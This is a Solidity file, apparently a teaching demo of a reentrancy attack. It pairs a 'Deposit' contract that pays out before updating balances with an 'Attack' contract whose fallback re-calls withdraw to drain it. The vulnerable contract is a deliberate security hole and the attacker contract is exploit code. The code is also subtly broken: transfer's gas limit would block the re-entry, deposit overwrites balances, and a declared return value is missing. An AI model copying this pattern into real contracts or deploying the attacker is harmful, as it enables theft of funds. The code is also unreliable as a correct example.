//SPDX-License-Identifier:MIT

pragma solidity >=0.5.0 <=0.9.0;

contract Deposit{
    mapping(address=>uint) public balance;

    function deposit() public payable{
        //Here the other smart contract will deposit some amount of ethers
        balance[msg.sender]=msg.value;
    }

    function withdraw(uint _withdrawamount) public{
        require(_withdrawamount<=balance[msg.sender],"The user cannot withdraw more than the balance");
        payable(msg.sender).transfer(_withdrawamount);

        balance[msg.sender]-=_withdrawamount;
    }

    function getbalance() public returns(uint){
        return address(this).balance;
    }
}

contract Attack{

    //Now this is the smart contract that will have two functions
    //The first is the fallback function

    Deposit public deposit;

    fallback() external payable{
        deposit.withdraw(1);
    }

    constructor(address _deposit){
        deposit=Deposit(_deposit);
    }

    

    function calling() external payable returns(bool)
    {
        //Inside the deposit function the smart contract first deposits some ethers to the other smart contract
        //  (bool success, bytes memory _data)=_testdhruv.call{value:100}(abi.encodeWithSignature("foo(uint256)",5));
        deposit.deposit{value:msg.value}();
        deposit.withdraw(1);

    }
}